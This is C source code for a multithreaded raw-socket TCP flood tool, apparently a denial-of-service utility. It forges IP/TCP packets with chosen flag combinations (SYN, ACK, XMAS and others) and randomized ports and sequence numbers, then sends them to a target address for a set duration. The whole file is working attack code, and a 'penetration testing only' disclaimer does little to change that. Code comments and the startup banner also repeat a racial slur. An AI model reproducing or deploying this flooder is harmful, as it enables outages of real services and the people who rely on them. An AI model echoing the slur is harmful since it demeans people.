/*
 * TCP Observer Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol
 * usage: sudo ./observer <target_ip> <port> <threads> <duration> [options]
 * disclaimer: for authorized penetration testing only
 * // nigga
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

// config // nigga
struct observer_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    uint8_t ip_tos;
    uint16_t ip_ident;
    uint8_t ip_ttl;
    uint8_t dont_frag;
    uint8_t urg_flag, ack_flag, psh_flag, rst_flag, syn_flag, fin_flag;
    int method;
    uint32_t payload_size;
    uint8_t payload_random;
    volatile uint8_t running;
    uint64_t total_packets;
    uint64_t total_bytes;
};

static struct observer_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL);
    rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock();
    rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0];
    t ^= t << 11;
    t ^= t >> 8;
    rand_state[0] = rand_state[1];
    rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3];
    rand_state[3] ^= rand_state[3] >> 19;
    rand_state[3] ^= t;
    return rand_state[3];
}

static void rand_bytes(char *buf, int len) {
    while (len > 0) {
        if (len >= 4) { *((uint32_t *)buf) = rand_next(); buf += 4; len -= 4; }
        else { *buf++ = rand_next() & 0xFF; len--; }
    }
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

static uint16_t checksum_tcp(struct iphdr *iph, struct tcphdr *tcph, uint16_t data_len, int len) {
    const uint16_t *buf = (uint16_t *)tcph;
    uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len == 1) sum += *((uint8_t *)buf);
    sum += (iph->saddr >> 16) & 0xFFFF;
    sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF;
    sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += data_len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static uint32_t get_local_ip(void) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    struct sockaddr_in server, local;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("8.8.8.8");
    server.sin_port = htons(53);
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) { close(sock); return 0; }
    socklen_t len = sizeof(local);
    if (getsockname(sock, (struct sockaddr *)&local, &len) < 0) { close(sock); return 0; }
    close(sock);
    return local.sin_addr.s_addr;
}

static void set_tcp_flags(struct tcphdr *tcph, int method) {
    tcph->syn = tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 0;
    switch (method) {
        case 0: tcph->syn = 1; break;
        case 1: tcph->ack = 1; break;
        case 2: tcph->psh = 1; tcph->ack = 1; break;
        case 3: tcph->fin = 1; tcph->ack = 1; break;
        case 4: tcph->rst = 1; break;
        case 5: tcph->urg = 1; tcph->psh = 1; break;
        case 6: tcph->syn = tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 1; break;
        case 7: tcph->fin = tcph->psh = tcph->urg = 1; break;
        default: tcph->syn = 1; break;
    }
}

// nigga observer thread
static void* observer_thread(void *arg) {
    int thread_id = *(int *)arg;
    free(arg);
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) {
        fprintf(stderr, "[thread %d] raw socket: %s\n", thread_id, strerror(errno));
        return NULL;
    }
    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(raw_sock); return NULL;
    }
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(raw_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(raw_sock, F_SETFL, O_NONBLOCK | fcntl(raw_sock, F_GETFL, 0));
    uint32_t target_addr = inet_addr(config.target_ip);
    uint32_t local_addr = get_local_ip();
    if (local_addr == 0) { fprintf(stderr, "[thread %d] no local ip\n", thread_id); close(raw_sock); return NULL; }
    int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + config.payload_size;
    char *packet = malloc(pkt_size);
    if (!packet) { close(raw_sock); return NULL; }
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(iph, 0, sizeof(struct iphdr));
    iph->version = 4; iph->ihl = 5; iph->tos = config.ip_tos;
    iph->tot_len = htons(pkt_size);
    iph->id = (config.ip_ident == 0xFFFF) ? htons(rand_next() & 0xFFFF) : htons(config.ip_ident);
    iph->ttl = config.ip_ttl;
    if (config.dont_frag) iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = local_addr;
    iph->daddr = target_addr;
    memset(tcph, 0, sizeof(struct tcphdr));
    tcph->source = htons(rand_next() % 60000 + 1024);
    tcph->dest = htons(config.target_port);
    tcph->seq = htonl(rand_next());
    tcph->ack_seq = htonl(rand_next());
    tcph->doff = 5; tcph->window = htons(65535);
    set_tcp_flags(tcph, config.method);
    if (config.urg_flag) tcph->urg = 1;
    if (config.ack_flag) tcph->ack = 1;
    if (config.psh_flag) tcph->psh = 1;
    if (config.rst_flag) tcph->rst = 1;
    if (config.syn_flag) tcph->syn = 1;
    if (config.fin_flag) tcph->fin = 1;
    if (config.payload_random) rand_bytes(payload, config.payload_size);
    else memset(payload, 0x00, config.payload_size);
    struct sockaddr_in target_sock;
    target_sock.sin_family = AF_INET;
    target_sock.sin_addr.s_addr = target_addr;
    target_sock.sin_port = htons(config.target_port);
    printf("[thread %d] flooding started\n", thread_id);
    time_t end_time = time(NULL) + config.duration;
    uint64_t thread_packets = 0, thread_bytes = 0;
    while (config.running && time(NULL) < end_time) {
        if (config.ip_ident == 0xFFFF) iph->id = htons(rand_next() & 0xFFFF);
        tcph->source = htons(rand_next() % 60000 + 1024);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        if (config.payload_random) rand_bytes(payload, config.payload_size);
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        tcph->check = 0;
        tcph->check = checksum_tcp(iph, tcph, htons(sizeof(struct tcphdr) + config.payload_size), sizeof(struct tcphdr) + config.payload_size);
        int sent = sendto(raw_sock, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&target_sock, sizeof(target_sock));
        if (sent > 0) { thread_packets++; thread_bytes += sent; }
    }
    pthread_mutex_lock(&stats_mutex);
    config.total_packets += thread_packets;
    config.total_bytes += thread_bytes;
    pthread_mutex_unlock(&stats_mutex);
    printf("[thread %d] stopped (packets=%llu, bytes=%llu)\n", thread_id, (unsigned long long)thread_packets, (unsigned long long)thread_bytes);
    free(packet);
    close(raw_sock);
    return NULL;
}

static void sigint_handler(int sig) { (void)sig; printf("\n[*] stopping...\n"); config.running = 0; }

static void usage(const char *prog) {
    printf("TCP Observer Flood - by c0re_x64 for 0v.lol\n");
    printf("usage: sudo %s <ip> <port> <threads> <duration> [--method 0-7] [--size N] [--df] [--urg|--ack|--psh|--rst|--syn|--fin]\n", prog);
    printf("method: 0=syn 1=ack 2=psh 3=fin 4=rst 5=urg 6=all 7=xmas\n");
}

int main(int argc, char **argv) {
    if (argc < 5) { usage(argv[0]); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "need root\n"); return 1; }
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]);
    config.threads = atoi(argv[3]);
    config.duration = atoi(argv[4]);
    config.ip_ident = 0xFFFF;
    config.ip_ttl = 64;
    config.method = 0;
    config.payload_size = 0;
    config.payload_random = 1;
    config.running = 1;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--tos") == 0 && i + 1 < argc) config.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i + 1 < argc) config.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ident") == 0 && i + 1 < argc) config.ip_ident = atoi(argv[++i]);
        else if (strcmp(argv[i], "--df") == 0) config.dont_frag = 1;
        else if (strcmp(argv[i], "--method") == 0 && i + 1 < argc) config.method = atoi(argv[++i]);
        else if (strcmp(argv[i], "--urg") == 0) config.urg_flag = 1;
        else if (strcmp(argv[i], "--ack") == 0) config.ack_flag = 1;
        else if (strcmp(argv[i], "--psh") == 0) config.psh_flag = 1;
        else if (strcmp(argv[i], "--rst") == 0) config.rst_flag = 1;
        else if (strcmp(argv[i], "--syn") == 0) config.syn_flag = 1;
        else if (strcmp(argv[i], "--fin") == 0) config.fin_flag = 1;
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc) config.payload_size = atoi(argv[++i]);
        else if (strcmp(argv[i], "--static") == 0) config.payload_random = 0;
    }
    if (config.threads < 1 || config.threads > 256) { fprintf(stderr, "threads 1-256\n"); return 1; }
    if (config.duration < 1) { fprintf(stderr, "duration > 0\n"); return 1; }
    rand_init();
    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);
    printf("\n  ___  ____  ____  _   _ _   _ _____ ____  \n");
    printf(" / _ \\| __ )| __ )| | | | \\ | | ____|  _ \\ \n");
    printf("| | | |  _ \\|  _ \\| | | |  \\| |  _| | |_) |\n");
    printf("| |_| | |_) | |_) | |_| | |\\  | |___|  _ < \n");
    printf(" \\___/|____/|____/ \\___/|_| \\_|_____|_| \\_\\\n");
    printf(" TCP Observer - by c0re_x64 for 0v.lol // nigga\n\n");
    printf("[*] %s:%d threads=%d dur=%ds method=%d\n\n", config.target_ip, config.target_port, config.threads, config.duration, config.method);
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) { fprintf(stderr, "malloc fail\n"); return 1; }
    for (uint32_t i = 0; i < config.threads; i++) {
        int *tid = malloc(sizeof(int));
        *tid = i + 1;
        if (pthread_create(&threads[i], NULL, observer_thread, tid) != 0) { free(tid); }
        usleep(100000);
    }
    for (uint32_t i = 0; i < config.threads; i++) pthread_join(threads[i], NULL);
    free(threads);
    printf("\n[*] done pkts=%llu bytes=%llu\n", (unsigned long long)config.total_packets, (unsigned long long)config.total_bytes);
    return 0;
}
